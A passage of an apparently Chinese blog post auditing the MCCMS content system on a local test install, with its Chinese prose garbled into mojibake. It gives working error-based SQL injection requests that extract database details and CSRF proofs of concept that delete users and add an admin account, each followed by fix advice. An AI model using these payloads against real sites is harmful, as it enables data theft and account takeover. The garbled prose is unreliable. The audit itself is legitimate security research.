class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å…ˆç®€å•æ„é€ ä¸€ä¸ª</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET <span class="regexp">/index.php/</span>book<span class="regexp">/category/</span>order<span class="regexp">/addtime/</span>pay<span class="regexp">/1/</span>finish<span class="regexp">/1/</span>list/<span class="number">1</span>)+order+by+<span class="number">5</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure><p>å‘ç°æŠ¥é”™</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ä»</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>select * from mc_book where yid=0 and pay=0 and serialize=&#x27;è¿è½½&#x27; and cid in(1&amp;#039) order by addtime desc<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">å˜æˆ</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Unknown column &#x27;5&#x27; in &#x27;order clause&#x27;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">ç”±ç¬¦å·æŠ¥é”™ï¼Œå˜æˆå‘½ä»¤æŠ¥é”™ï¼Œçœ‹æ¥æˆ‘ä»¬çš„sqlå‘½ä»¤åœ¨è¿™ä¸ªæ„é€ ä¸­æ˜¯å¯ä»¥æ‰§è¡Œçš„</span><br></pre></td></tr></table></figure><p>é€šè¿‡<code>order by</code>ï¼Œåˆ¤æ–­å‡ºå½“å‰åˆ—æ•°åªæœ‰<code>1</code>åˆ—</p><p><img src="/2022/11/22/CMS-Test/image-20221127003105524.png" alt="image-20221127003105524"></p><p><img src="/2022/11/22/CMS-Test/image-20221127003130496.png" alt="image-20221127003130496"></p><p>æ­¤å¤„çš„æ³¨å…¥ç‚¹ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#125;<span class="keyword">elseif</span>(<span class="variable">$k</span> == <span class="string">&#x27;list&#x27;</span>)&#123; <span class="comment">//åˆ†ç±»</span></span><br><span class="line">                   <span class="variable">$title</span>[] = <span class="variable">$data</span>[<span class="string">&#x27;title&#x27;</span>] = <span class="title function_ invoke__">getzd</span>(<span class="string">&#x27;book_class&#x27;</span>,<span class="string">&#x27;name&#x27;</span>,<span class="variable">$v</span>);</span><br><span class="line">                   <span class="keyword">if</span>((<span class="keyword">int</span>)<span class="variable">$v</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                       <span class="variable">$cids</span> = <span class="title function_ invoke__">getcid</span>(<span class="variable">$v</span>);</span><br><span class="line">                       <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$cids</span>))&#123;</span><br><span class="line">                           <span class="variable">$sql</span> .= <span class="string">&quot; and cid in(&quot;</span>.<span class="variable">$cids</span>.<span class="string">&quot;)&quot;</span>;</span><br><span class="line">                       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                           <span class="variable">$sql</span> .= <span class="string">&quot; and cid=&quot;</span>.<span class="variable">$cids</span>;</span><br><span class="line">                       &#125;</span><br><span class="line">                   &#125;</span><br></pre></td></tr></table></figure><p><code>$cid</code>å°±æ˜¯å¼•èµ·<code>sql</code>æ³¨å…¥çš„å‚æ•°ç‚¹</p><p>è·Ÿè¿›<code>getcid</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è§£æå¤šä¸ªåˆ†ç±»ID  å¦‚ cid=1,2,3,4,5,6</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getcid</span>(<span class="params"><span class="variable">$CID</span>,<span class="variable">$type</span>=<span class="string">&#x27;class&#x27;</span>,<span class="variable">$zd</span>=<span class="string">&#x27;fid&#x27;</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ci</span> = &amp;<span class="title function_ invoke__">get_instance</span>();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$CID</span>))&#123;</span><br><span class="line"><span class="variable">$ClassArr</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$CID</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$ClassArr</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select id from &quot;</span>.Mc_SqlPrefix.<span class="variable">$type</span>.<span class="string">&quot; where &quot;</span>.<span class="variable">$zd</span>.<span class="string">&quot;=&#x27;<span class="subst">$ClassArr</span>[<span class="subst">$i</span>]&#x27;&quot;</span>;<span class="comment">//sqlè¯­å¥çš„ç»„ç»‡è¿”å›</span></span><br><span class="line"><span class="variable">$result</span>=<span class="variable">$ci</span>-&gt;db-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>)-&gt;<span class="title function_ invoke__">result</span>();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$row</span>) &#123;</span><br><span class="line"><span class="variable">$ClassArr</span>[]=<span class="variable">$row</span>-&gt;id;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$CID</span>=<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$ClassArr</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$CID</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°è¯•åå‘ç°æ— æ³•è¿›è¡Œè”åˆæ³¨å…¥</p><p>åªèƒ½è¯•è¯•æŠ¥é”™æ³¨å…¥æˆ–è€…ç›²æ³¨</p><p>ç›²æ³¨è¯•äº†è¯•å‘ç°æ˜¯æ— æ³•å¾—åˆ°ååº”çš„</p><p>äºæ˜¯æˆ‘è¯•äº†è¯•æŠ¥é”™æ³¨å…¥</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET <span class="regexp">/index.php/</span>book<span class="regexp">/category/</span>order<span class="regexp">/addtime/</span>pay<span class="regexp">/1/</span>finish<span class="regexp">/1/</span>list/<span class="number">1</span>)+and+updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,database(),<span class="number">0</span>x7e,user(),<span class="number">0</span>x7e,@@datadir),<span class="number">1</span>)%<span class="number">23</span></span><br></pre></td></tr></table></figure><p><img src="/2022/11/22/CMS-Test/image-20221127141028144.png" alt="image-20221127141028144"></p><p>æœç„¶æ˜¯æŠ¥é”™æ³¨å…¥ï¼Œæˆ‘ä»¬å¾—åˆ°äº†æˆ‘ä»¬æƒ³è¦çš„æ•°æ®ï¼Œè™½ç„¶å› ä¸ºæŠ¥é”™å‡½æ•°é™åˆ¶äº†æ˜¾ç¤ºæ•°æ®å­—ç¬¦ä¸ªæ•°ï¼Œç”¨<code>substring</code>å³å¯</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET <span class="regexp">/index.php/</span>book<span class="regexp">/category/</span>order<span class="regexp">/addtime/</span>pay<span class="regexp">/1/</span>finish<span class="regexp">/1/</span>list/<span class="number">1</span>)+and+updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,substring(@@datadir,<span class="number">15</span>),<span class="number">0</span>x7e),<span class="number">1</span>)%<span class="number">23</span> </span><br></pre></td></tr></table></figure><p><img src="/2022/11/22/CMS-Test/image-20221127141800552.png" alt="image-20221127141800552"></p><p>æœ€åå¾—åˆ°</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">æ•°æ®åº“å:mccms</span></span><br><span class="line"><span class="section">æ•°æ®åº“ç®¡ç†å‘˜åå­—:root</span></span><br><span class="line"><span class="section">æ•°æ®åº“è·¯å¾„: D:\phpstudy_pro\Extensions\MySQL8.0.12\data\</span></span><br></pre></td></tr></table></figure><h4 id="ä¿®å¤å»ºè®®-1"><a href="#ä¿®å¤å»ºè®®-1" class="headerlink" title="ä¿®å¤å»ºè®®"></a>ä¿®å¤å»ºè®®</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>å¯¹ä»£å…¥<span class="keyword">sql</span>æŸ¥è¯¢è¯­å¥çš„å‚æ•°è¿›è¡Œä¸¥æ ¼è¿‡æ»¤</span><br><span class="line"><span class="number">2.</span>å‡å°‘ç”¨æˆ·å¯¹ä¼ å…¥<span class="keyword">sql</span>æŸ¥è¯¢çš„ä¸­å‚æ•°çš„ç›´æ¥æ§åˆ¶çš„æœºä¼š</span><br><span class="line"><span class="number">3.</span>å¯¹ä¸€äº›æ•°æ®å‡½æ•°ç¦æ­¢ç”¨ï¼Œæˆ–è€…å°‘ç”¨</span><br><span class="line"><span class="number">4.</span>æœ€å¥½ä¸è¦ç›´æ¥æŠŠç”¨æˆ·æ•°æ®å¸¦å…¥æ•°æ®åº“ä¸­è¿›è¡ŒæŸ¥è¯¢</span><br></pre></td></tr></table></figure><h3 id="3-åå°ä¸€å¤„å®‰å…¨æ¼æ´"><a href="#3-åå°ä¸€å¤„å®‰å…¨æ¼æ´" class="headerlink" title="3.åå°ä¸€å¤„å®‰å…¨æ¼æ´"></a>3.åå°ä¸€å¤„å®‰å…¨æ¼æ´</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">åå°æ¼æ´</span><br><span class="line">ä¸€èˆ¬çŒœæµ‹ä¸ºç™»å½•å­˜åœ¨<span class="keyword">sql</span>æ³¨å…¥ï¼Œæ¨¡æ¿æ³¨å…¥ï¼Œè¶Šæƒï¼Œå‘½ä»¤æ‰§è¡Œ,csrfç­‰ç­‰</span><br></pre></td></tr></table></figure><h4 id="ä»£ç åˆ†æ-1"><a href="#ä»£ç åˆ†æ-1" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h4><p>ç”±äºä¹‹å‰ä¿®å¤è¿‡<code>sql</code>æ³¨å…¥ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œçš„å¯èƒ½æ€§å°±å¾ˆå°‘äº†ï¼Œäºæ˜¯å¯¹å…¶ä»–æ¼æ´è¿›è¡Œæµ‹è¯•</p><p>ä¸è¿‡ï¼ŒæŠ“åŒ…è¿‡ç¨‹ä¸­å‘ç°å…¶ä¿¡æ¯çš†æ˜¯ä»¥æ˜æ–‡å½¢å¼å‘é€</p><p>æ‰€ä»¥çŒœæµ‹å­˜åœ¨<code>csrf</code></p><p>ã€å…ˆè¿›è¡Œäº†æ¼æ´æµ‹è¯•ã€‘</p><p>ä»¥æ­¤å¤„ä¸ºä¾‹</p><p>å¯¹<code>csrf</code>å®ç°æ§åˆ¶ç®¡ç†å‘˜åˆ é™¤ç”¨æˆ·ä»£ç åˆ†æ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sys/apps/controllers/admin/User.php</span></span><br><span class="line"><span class="comment">//åˆ é™¤ä¼šå‘˜</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">del</span>(<span class="params"><span class="variable">$id</span>=<span class="number">0</span></span>)</span>&#123;</span><br><span class="line">     <span class="variable">$id</span> = (<span class="keyword">int</span>)<span class="variable">$id</span>;</span><br><span class="line">     <span class="keyword">if</span>(<span class="variable">$id</span> == <span class="number">0</span>)&#123;</span><br><span class="line">     <span class="variable">$ids</span> = <span class="variable language_">$this</span>-&gt;input-&gt;<span class="title function_ invoke__">get_post</span>(<span class="string">&#x27;id&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">/*get_postå…ˆæŸ¥çœ‹GETæ•°æ®ä¸­çš„idï¼Œå†æŸ¥çœ‹POSTæ•°æ®ä¸­çš„id</span></span><br><span class="line"><span class="comment">            è¿™é‡Œä¹Ÿæ˜¯æˆ‘ä»¬å®ç°csrfçš„å…³é”®å¤„ï¼Œ</span></span><br><span class="line"><span class="comment">            è¿™é‡Œçš„idä»¥æ˜æ–‡æ˜¾ç¤ºï¼Œä»¥æ˜æ–‡è¯»å–ï¼Œé‚£ä¹ˆåªè¦ä¿®æ”¹æ˜æ–‡ï¼Œä»»æ„çš„idéƒ½å¯ä»¥å®ç°è¿›è¡Œåç»­åˆ é™¤æ“ä½œ</span></span><br><span class="line"><span class="comment">            å¦‚æœå‰ç«¯å¯¹æ˜æ–‡æ•°æ®åŠ å¯†ï¼Œå†åœ¨è¿™é‡Œæ¯”è¾ƒåŒ¹å¯¹åï¼Œå†ä¼ å‚å¯èƒ½æ›´å®‰å…¨*/</span></span><br><span class="line">            </span><br><span class="line">     <span class="variable">$ids</span> = <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$ids</span>);</span><br><span class="line">            <span class="comment">/*implode â€”ç”¨å­—ç¬¦ä¸²è¿æ¥æ•°ç»„å…ƒç´ */</span></span><br><span class="line">     <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$ids</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^([0-9]+[,]?)+$/&#x27;</span>, <span class="variable">$ids</span>))&#123;</span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$ids</span>;</span><br><span class="line">&#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$id</span>)) <span class="title function_ invoke__">get_json</span>(<span class="string">&#x27;IDä¸èƒ½ä¸ºç©º~!&#x27;</span>);</span><br><span class="line">     <span class="variable">$arr</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$id</span>);</span><br><span class="line">     <span class="keyword">foreach</span> (<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$_id</span>) &#123;</span><br><span class="line">     <span class="comment">//åˆ é™¤å¤´åƒåœ°å€</span></span><br><span class="line"><span class="variable">$pic</span> = <span class="title function_ invoke__">getzd</span>(<span class="string">&#x27;user&#x27;</span>,<span class="string">&#x27;pic&#x27;</span>,<span class="variable">$id</span>);</span><br><span class="line"><span class="variable language_">$this</span>-&gt;load-&gt;<span class="title function_ invoke__">model</span>(<span class="string">&#x27;tongbu&#x27;</span>);</span><br><span class="line"><span class="variable language_">$this</span>-&gt;tongbu-&gt;<span class="title function_ invoke__">del</span>(<span class="variable">$pic</span>);</span><br><span class="line"><span class="comment">//åˆ é™¤è®°å½•</span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;mcdb-&gt;<span class="title function_ invoke__">get_del</span>(<span class="string">&#x27;user&#x27;</span>,<span class="variable">$_id</span>);</span><br><span class="line">     &#125;</span><br><span class="line"><span class="variable">$arr</span>[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&#x27;æ­å–œæ‚¨ï¼Œåˆ é™¤æˆåŠŸ~!&#x27;</span>;</span><br><span class="line"><span class="variable">$arr</span>[<span class="string">&#x27;url&#x27;</span>] = <span class="title function_ invoke__">links</span>(<span class="string">&#x27;user&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">get_json</span>(<span class="variable">$arr</span>,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="æ¼æ´åˆ©ç”¨-1"><a href="#æ¼æ´åˆ©ç”¨-1" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h4><p><code>CSRF</code>æ­¤å¤„ä»¥ç®¡ç†å‘˜å¯ä»¥åˆ é™¤ç”¨æˆ·ä¸ºä¾‹</p><p>è¿™æ˜¯åœ¨åˆ é™¤ç”¨æˆ·æ—¶è¿›è¡Œçš„æŠ“åŒ…æ•°æ®ï¼Œå‘ç°å…¶ä¿¡æ¯çš†ä»¥æ˜æ–‡æ˜¾ç¤ºï¼Œåªè¦ä¿®æ”¹<code>id</code>æ•°æ®å°±å¯ä»¥è¾¾åˆ°åˆ é™¤æŒ‡å®šç”¨æˆ·çš„ç›®çš„</p><p><img src="/2022/11/22/CMS-Test/image-20221126222051780.png" alt="image-20221126222051780"></p><p>å…ˆåˆ›å»º<code>2</code>ä¸ªç”¨æˆ·ï¼Œ<code>id</code>ä¸º<code>3ï¼Œ4</code></p><p><img src="/2022/11/22/CMS-Test/image-20221126222725930.png" alt="image-20221126222725930"></p><p>ç„¶åæ ¹æ®æˆ‘ä»¬çš„æŠ“åŒ…æ•°æ®æ„é€ ä¸€ä¸ªé’“é±¼çš„é“¾æ¥</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">a</span> href=<span class="string">&quot;http://127.0.0.3/admin.php/user/del?id%5B%5D=3&quot;</span>&gt;click me&lt;/<span class="keyword">a</span>&gt;  </span><br><span class="line"><span class="comment">#è¿™é‡Œçš„idä»¥GETæ–¹å¼æäº¤ä¹Ÿå¯ä»¥</span></span><br></pre></td></tr></table></figure><p><img src="/2022/11/22/CMS-Test/image-20221126224127893.png" alt="image-20221126224127893"></p><p>ä¿æŒç™»å½•çš„çŠ¶æ€ç‚¹å‡»</p><p><img src="/2022/11/22/CMS-Test/image-20221126224210939.png" alt="image-20221126224210939"></p><p>ä¹Ÿè¯•äº†è¯•<code>4</code></p><p><img src="/2022/11/22/CMS-Test/image-20221126224303900.png" alt="image-20221126224303900"></p><p>å‘ç°ä¹Ÿæ˜¾ç¤ºæˆåŠŸ</p><p>è¿™æ˜¯æˆ‘ä»¬è¿”å›åå°æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯</p><p><img src="/2022/11/22/CMS-Test/image-20221126224401491.png" alt="image-20221126224401491"></p><p>å‘ç°åªæœ‰<code>ID=1</code>çš„ç”¨æˆ·äº†</p><p>æˆ‘ä»¬çš„<code>csrf</code>ä¹Ÿå°±æ”»å‡»æˆåŠŸäº†</p><p>ç”šè‡³æ·»åŠ åå°ç®¡ç†å‘˜è´¦æˆ·ä¹Ÿæ˜¯å¯ä»¥</p><p><img src="/2022/11/22/CMS-Test/image-20221128180130164.png" alt="image-20221128180130164"></p><p><img src="/2022/11/22/CMS-Test/image-20221128180148359.png" alt="image-20221128180148359"></p><p>æ„é€ é’“é±¼é“¾æ¥</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>MCCMS POST<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;btn2()&quot;</span>&gt;</span>MCCMS CSRF<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.3/admin.php/sys/save&quot;</span>  <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">id</span>=<span class="string">&quot;test&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacker&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;nichen&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Ttoc&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;pass&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123456&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">btn2</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> f = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;test&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            f.<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>post</code>æ–¹å¼ä»¥ç«ç‹æµè§ˆå™¨æäº¤</p><p><img src="/2022/11/22/CMS-Test/image-20221128201313981.png" alt="image-20221128201313981"></p><p>æäº¤æˆåŠŸï¼ŒæˆåŠŸå‘åå°æ·»åŠ äº†æˆ‘ä»¬çš„æ¶æ„ç”¨æˆ·</p><p><img src="/2022/11/22/CMS-Test/image-20221128201331468.png" alt="image-20221128201331468"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">é™¤æ­¤ä»¥å¤–</span><br><span class="line"></span><br><span class="line">å…¶ä»–ç®¡ç†å‘˜å¯ä»¥æ§åˆ¶çš„æ“ä½œï¼Œæ¯”å¦‚ä¿®æ”¹ç”¨æˆ·é‡‘å¸æ•°ï¼Œæœˆç¥¨æ•°ç­‰ç­‰ï¼Œå› ä¸ºéƒ½æ˜¯ä»¥æ˜æ–‡æäº¤ï¼Œéƒ½å¯ä»¥ç”¨csrfå®ç°</span><br></pre></td></tr></table></figure><hr><h4 id="ä¿®å¤å»ºè®®-2"><a href="#ä¿®å¤å»ºè®®-2" class="headerlink" title="ä¿®å¤å»ºè®®"></a>ä¿®å¤å»ºè®®</h4><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">æ­¤å¤„æˆ‘ä»¬å‘ç°ç”¨æˆ·å‡­æ®å‘ç°ä»¥æ˜æ–‡å½¢å¼å‘é€</span><br><span class="line">é‚£ä¹ˆä¸­é—´å°±å¯èƒ½è¢«ç¬¬ä¸‰æ–¹è·å–å¹¶åˆ©ç”¨ï¼Œæ‰€ä»¥å»ºè®®</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>å¯¹æ•°æ®è¿›è¡Œè¿›ä¸€æ­¥çš„åŠ å¯†</span><br><span class="line"><span class="number">2.</span>å¯ä»¥åœ¨HTTPè¯·æ±‚ä¸­åŠ å…¥ä¸€ä¸ªéšæœºäº§ç”Ÿçš„<span class="built_in">token</span>ï¼Œå¹¶åœ¨åå°æœåŠ¡å™¨ç«¯éªŒè¯<span class="built_in">token</span>ï¼Œå¦‚æœè¯·æ±‚ä¸­æ²¡æœ‰<span class="built_in">token</span>æˆ–è€…<span class="built_in">token</span>å†…å®¹ä¸æ­£ç¡®ï¼Œåˆ™è®¤ä¸ºè¯·æ±‚å¯èƒ½æ˜¯csrfæ”»å‡»ï¼Œä»è€Œæ‹’ç»è¯¥è¯·æ±‚</span><br><span class="line"><span class="number">3.</span>éªŒè¯è¯·æ±‚çš„refererå€¼</span><br><span class="line"><span class="number">4.</span>å¯¹å‚æ•°ä¼ å…¥æ–¹å¼å’ŒéªŒè¯çš„è¿‡ç¨‹ä¸¥æ ¼æ§åˆ¶ï¼Œä»¥å…ä¼ å…¥å¤–æ¥æ¶æ„æ•°æ®ï¼Œå¯¼è‡´ä¿¡æ¯æ³„éœ²æˆ–ä¸¢å¤±</span><br><span class="line"><span class="number">5.</span>ç”¨æˆ·äºŒæ¬¡éªŒè¯ï¼Œå¯¹äºè¿™ç§ä¸å¯é€†æ“ä½œæ‰§è¡Œå‰è¿›è¡Œæ¯”å¦‚æ‰‹æœºéªŒè¯ç ä¹‹ç±»çš„ç¬¬äºŒæ¬¡éªŒè¯ï¼Œä¸ä»¥cookieä¸ºå”¯ä¸€éªŒè¯</span><br></pre></td></tr></table></figure><h3 id="4-ä½œå®¶å‘å¸ƒæ¼«ç”»å°è¯´å‘½ä»¤æ‰§è¡Œæ¼æ´-å¤ç°å¤±è´¥"><a href="#4-ä½œå®¶å‘å¸ƒæ¼«ç”»å°è¯´å‘½ä»¤æ‰§è¡Œæ¼æ´-å¤ç°å¤±è´¥" class="headerlink" title="4.ä½œå®¶å‘å¸ƒæ¼«ç”»å°è¯´å‘½ä»¤æ‰§è¡Œæ¼æ´(å¤ç°å¤±è´¥)"></a>4.ä½œå®¶å‘å¸ƒæ¼«ç”»å°è¯´å‘½ä»¤æ‰§è¡Œæ¼æ´(å¤ç°å¤±è´¥)</h3><h4 id="ä»£ç åˆ†æ-æ¼æ´åˆ©ç”¨-1"><a href="#ä»£ç 